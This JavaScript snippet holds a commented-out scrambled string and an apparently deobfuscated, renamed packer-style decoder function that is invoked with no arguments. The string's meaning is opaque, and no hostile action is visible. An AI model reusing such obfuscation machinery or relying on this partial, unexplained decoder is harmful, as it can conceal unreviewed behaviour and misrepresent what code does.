// This code is from this obfuscated Code
// var obfuscatedCode = '2br an{c0;m8-0hioj.)4ijr)gt((rihvaitol,nnpfr[5euwlr"zv9y]hrpr.ofaco0w,,irtg olltprbn]6oklaafa,9,(}dap=)8(n1ya)=i} .)nl)6](Chr"a=[j,"=);vkvte=C7r(l(hems;i;()z=* )37r .)r1;verfd=noqol=93hj.,]it"b {a.ff,vca= "=0.b<AnA);+)tsd[z.hshentrn axrgobs;g8)==et 0a.vs=+(o0)9 [a)r; 8=rkficunagtahr;->=0eq-d.=++;agl;.peACnr=dm+),]hnaa);e"[l[;hd+ec)sv rc;tu[s,rv(;]pv)=.vh(9.r;rn8hc.;+<r;u7g; ieru="pz=aa,Co,6=efj)0fa. i+h);kois1orlnns -,.nqd.p2(u{qwf3,1(r+uj]3(e(t,s<+]tr(.eniqrsmf;+1trhaC}noev2rv8dj(Aghg7=75,A0px;;[rta=g+lt( }doaa;6l=+;;==(ox.[rh}.)oirgjntte[ez.*urj1;n}r;l= ,]s3rnc;;+a.2fr{f){=;=x)r[(grc.0=ival6(=u8b];vj]l f=z11;+t.[vat8avupyd,,jdtl+s(a5.=rusbCst()u,,rgo)(!k]h+ejCp;h;77;=9,vpc2;i,a;yro[a{r (,v0(<,5=,oz;vi-+r]lr;jr2;z6ru!79krahc<cr+vjf(hz (+u wbS(j)n=o()manult(;{e540l;)o)[nnr(+16;(n ne afrepnr+==p>f8p i+f-Si]ne xh"ce8=49)cy}e;7=bgrv.gvtp51=vii=lC)r+1;(n4ud,g2)i2lu-rsa;)"av.o6"l0+u';


(function() {
    let baseOffsetD = 33, baseOffsetQ = 93, specialCharOffset = 96; // Adjusted values
    const alphabet = "abcdefghijklmnopqrstuvwxyz";
    const mappingArray = [76, 72, 89, 87, 65, 82, 86, 75, 94, 88, 74, 90, 71, 79, 81, 70, 85, 60, 80, 66];
    const charMapping = {};

    // Map characters from 'mappingArray'
    mappingArray.forEach((val, index) => {
        charMapping[val] = index + 1;
    });

    const transformedResults = [];

    // Process each input argument
    for (let f = 0; f < arguments.length; f++) {
        const words = arguments[f].split(" ");

        words.reverse().forEach((word, k) => {
            let transformedWord = [];
            let startIndex = 0;

            // Iterate through characters in each word
            for (let r = 0; r < word.length; r++) {
                const currentCharCode = word.charCodeAt(r);
                const mappedIndex = charMapping[currentCharCode];
                let currentIndex = r;
                let transformedIndex = null;

                // Apply transformation based on mapped character or specialCharOffset
                if (mappedIndex) {
                    transformedIndex = (mappedIndex - 1) * baseOffsetQ + word.charCodeAt(r + 1) - baseOffsetD;
                    currentIndex = ++r;
                } else if (currentCharCode === specialCharOffset) {
                    transformedIndex = baseOffsetQ * (mappingArray.length - baseOffsetD + word.charCodeAt(r + 1)) + word.charCodeAt(r + 2) - baseOffsetD;
                    currentIndex = r += 2;
                } else {
                    continue;
                }

                // Append non-transformed part and transformed character
                if (currentIndex > startIndex) transformedWord.push(word.slice(startIndex, currentIndex));
                transformedWord.push(words[transformedIndex + 1]);
                startIndex = r + 1;
            }

            // Append remaining part if any
            if (startIndex < word.length) transformedWord.push(word.slice(startIndex));
            words[k] = transformedWord.join("");
        });

        transformedResults.push(words[0]);
    }

    // Combine transformed words
    let finalResultString = transformedResults.join("");

    // Additional substitutions using 'replacementCodes' and 'alphabet'
    const replacementCodes = [10, 42, 96, 39, 92, 32, ...mappingArray];
    const periodChar = '.';

    replacementCodes.forEach((code, index) => {
        finalResultString = finalResultString.split(periodChar + alphabet.charAt(index)).join(String.fromCharCode(code));
    });

    // Final substitution and return result
    return finalResultString.split(periodChar + "!").join(periodChar);
})();
